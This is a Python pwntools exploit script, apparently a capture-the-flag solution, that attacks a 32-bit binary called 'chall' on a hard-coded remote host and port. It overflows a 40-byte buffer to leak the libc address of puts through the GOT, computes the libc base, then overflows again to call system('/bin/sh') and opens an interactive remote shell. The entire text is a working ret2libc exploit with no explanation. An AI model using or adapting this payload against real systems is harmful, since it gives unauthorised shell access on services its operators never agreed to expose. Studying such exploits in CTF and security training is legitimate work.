from pwn import *

elf = context.binary = ELF('./chall')
libc = ELF('./libc.so.6')

host = args.HOST or '13.233.104.112'
port = int(args.PORT or 2222)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
puts_plt = p32(0x080490a0)

p.recvuntil('May I know your name?\n')
payload = 'A' * 40 + puts_plt + p32(elf.sym['main']) + p32(elf.got['puts'])
p.sendline(payload)
p.recvline()
leak = u32(p.recv(4))
log.info('Leak: {}'.format(hex(leak)))
libc_base = leak - libc.sym['puts']
log.info('Libc Base: {}'.format(hex(libc_base)))

RET = p32(0x0804900e)
system = p32(libc_base + libc.sym['system'])
binsh = p32(libc_base + libc.search('/bin/sh').next())
p.recvuntil('May I know your name?\n')
payload = 'A' * 40 + RET + system + 'A' * 4 + binsh
p.sendline(payload)
p.interactive()
p.close()